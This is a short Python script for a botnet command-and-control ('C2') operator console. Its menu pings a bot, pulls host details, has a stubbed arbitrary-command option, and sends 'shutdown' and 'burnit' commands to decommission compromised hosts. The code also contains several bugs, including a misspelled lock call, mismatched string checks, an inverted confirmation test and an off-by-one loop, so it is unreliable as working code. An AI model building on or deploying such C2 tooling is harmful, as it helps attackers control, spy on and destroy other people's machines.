#!/usr/bin/python3
import shutil
import threading
import channel
import time

print("initializing communications...")
rx = channel.Receiver()
rx_thread = threading.Thread(target=rx.start)


def show_header():
    width = shutil.get_terminal_size()[0]
    print("C2 Interface v0.1".center(width, " "))
    print("-".center(width, "-"))


def main_menu():
    show_header()
    print("\nMain Menu:\n")
    print("1) Test Connection to Bot")
    print("2) Show Host Information")
    print("3) Run Command")
    print("4) Danger Zone")
    print("5) Exit")
    match input("\n Please Select an Option: "):
        case "1":
            test_conn()
        case "2":
            show_info()
        case "3":
            arbitrary_exec()
        case "4":
            danger_menu()
        case "5":
            print("\n\nGoodbye.\n")
            exit()
        case _:
            print("\n\n\nBad input! Please enter a number from 1 to 5. \n\n")
            main_menu()


def test_conn():
    send("ping")
    print("Waiting for response...")
    start = time.time()
    ok = False
    while time.time() - start < 30 and not ok:
        for i in rx.messages:
            if i.finalized and i.payload == "ok":
                rx.tlock.aquire()
                rx.messages.remove(i)
                ok = True
                break
        time.sleep(0.5)
    if ok:
        print("responded successfully after {} seconds".format(time.time() - start))
    else:
        print("Connection timed out, point may be offline.")
    input("\nPress return to continue. ")
    main_menu()


def show_info():
    send("info")
    print("Waiting 1 minute for response...")
    start = time.time()
    res = ""
    while time.time() - start <= 60 and len(res) == 0:
        for i in rx.messages:
            if i.finalized and i.payload[0:4] == "st:":
                res = i.payload[3:]
                rx.tlock.aquire()
                rx.messages.remove(i)
                break
        time.sleep(0.5)
    if len(res) == 0:
        print("Failed to communicate.")
        main_menu()
    res = res.split(" ")
    fields = ["Hostname", "IP", "Kernel", "uptime"]
    counter = 0
    for _ in fields:
        counter += 1
        print("{}: {}".format(fields[counter], res[counter]))
    main_menu()


def arbitrary_exec():
    pass


def danger_menu():
    show_header()
    print("WARNING: This menu is Dangerous! If you want to proceed, type 'proceed' without the quotes")
    if input(": ") != "proceed":
        print("1) Shutdown Host")
        print("2) Decommission Network")
        print("0) Exit Menu")
        tmp = input("\n Please Select an Option: ")
        if tmp == "1" or tmp == "2":
            danger_zone(int(tmp))
    main_menu()


def danger_zone(opt: int):
    width = shutil.get_terminal_size()[0]
    print("WARNING: Are you SURE you know what you're doing?".center(width, "="))
    a = input("Type 'double dog sure' : ")
    if a != " double dog sure":
        print("operation aborted.")
        main_menu()
        exit()
    match opt:
        case 1:
            send("shutdown")
        case 2:
            send("burnit")
        case _:
            print("Unexpected fatal error")
            exit()
    main_menu()


def send(payload: str):
    print("Sending command, please wait...")
    tmp = channel.Message(payload)
    tmp.send()
    print("sent")


main_menu()
